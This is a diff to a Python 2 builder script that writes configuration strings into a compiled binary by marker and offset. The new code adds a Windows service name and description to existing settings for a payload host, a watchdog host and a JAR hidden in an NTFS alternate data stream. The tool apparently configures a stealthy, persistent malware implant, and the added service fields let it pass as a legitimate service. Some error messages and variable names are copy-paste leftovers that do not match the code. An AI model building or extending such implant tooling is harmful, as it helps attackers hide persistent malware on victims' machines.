@@ -28,6 +28,14 @@ payload_host_str = '\x00\x00\x11\x00\x17\x00\x29\x00\x4c'
 ads_off = 400 * 2
 ads_path_str = '\x00\x00\x13\x00\x25\x00\x14\x00\x38'
 
+#service name
+svc_name_off = 200 * 2
+svc_name_str = '\x00\x00\x1a\x00\x62\x00\x11\x00\x51'
+
+#service description
+svc_desc_off = 200 * 2
+svc_desc_str = '\x00\x00\x14\x00\x54\x00\x15\x00\x41' 
+
 def encodeStr( word ):
   out = ''
   for i in word:
@@ -37,6 +45,66 @@ def encodeStr( word ):
     nib_h = (o & 0xf0) >> 4
     out += chr(nib_h) + chr(nib_l)
   return out
+  
+def setServiceName( filepath ):
+  print "\nEnter the service name"
+  sys.stdout.write('> ')
+  in_data = raw_input()
+  if len(in_data) > 200 / 2:
+    print "Error: Length of the service name string too long. Max Length = 100"
+    return
+  
+  #convert to unicode
+  in_data = encodeStr(in_data)
+  uni_port = in_data.encode('utf16')[2:] + "\x00\x00\x00\x00"
+  
+  #Open the file
+  f = open(filepath, 'rb')
+  data = f.read()
+  f.close()  
+
+  #Find port marker
+  idx = data.find(svc_name_str)
+  print "Index: ", idx
+  cert_str_off = idx - svc_name_off
+  #print binascii.hexlify(data[port_str_off: port_str_off + port_off ])
+  #print "Current certificate name: " + data[cert_str_off: cert_str_off + cert_off ]
+  
+  #Overwrite the string
+  fh = open(filepath, "r+b")
+  fh.seek(cert_str_off)
+  fh.write(uni_port)
+  fh.close()
+  
+def setServiceDescription( filepath ):
+  print "\nEnter the service description"
+  sys.stdout.write('> ')
+  in_data = raw_input()
+  if len(in_data) > 200 / 2:
+    print "Error: Length of the service description string too long. Max Length = 100"
+    return
+  
+  #convert to unicode
+  in_data = encodeStr(in_data)
+  uni_port = in_data.encode('utf16')[2:] + "\x00\x00\x00\x00"
+  
+  #Open the file
+  f = open(filepath, 'rb')
+  data = f.read()
+  f.close()  
+
+  #Find port marker
+  idx = data.find(svc_desc_str)
+  print "Index: ", idx
+  cert_str_off = idx - svc_desc_off
+  #print binascii.hexlify(data[port_str_off: port_str_off + port_off ])
+  #print "Current certificate name: " + data[cert_str_off: cert_str_off + cert_off ]
+  
+  #Overwrite the string
+  fh = open(filepath, "r+b")
+  fh.seek(cert_str_off)
+  fh.write(uni_port)
+  fh.close()
 
 def setAdsPath( filepath ):
   print "\nEnter the path to store the JAR ADS"
@@ -162,7 +230,7 @@ def setJvmPath( filepath ):
   print "\nEnter the JVM Path"
   sys.stdout.write('> ')
   cert_in = raw_input()
-  if len(cert_in) > 200 / 2:
+  if len(cert_in) > 400 / 2:
     print "Error: Length of certificate string too long. Max Length = 100"
     return
   
@@ -178,13 +246,13 @@ def setJvmPath( filepath ):
   #Find port marker
   idx = data.find(jvm_path)
   #print "Index: ", idx
-  cert_str_off = idx - jvm_off
+  jvm_str_off = idx - jvm_off
   #print binascii.hexlify(data[port_str_off: port_str_off + port_off ])
   #print "Current certificate name: " + data[cert_str_off: cert_str_off + cert_off ]
   
   #Overwrite the string
   fh = open(filepath, "r+b")
-  fh.seek(cert_str_off)
+  fh.seek(jvm_str_off)
   fh.write(uni_port)
   fh.close()
   
@@ -196,7 +264,9 @@ def print_menu():
   print "3. Set Watchdog Host Path"
   print "4. Set Payload Host Path"
   print "5. Set JAR ADS Path"
-  print "6. Quit\n"
+  print "6. Set Service Name"
+  print "7. Set Service Description"
+  print "8. Quit\n"
   sys.stdout.write('> ')
   return raw_input()
 
@@ -226,4 +296,8 @@ while(1):
   elif choice == '5':
     setAdsPath(filepath)
   elif choice == '6':
+    setServiceName(filepath)
+  elif choice == '7':
+    setServiceDescription(filepath)
+  elif choice == '8':
     exit(1)
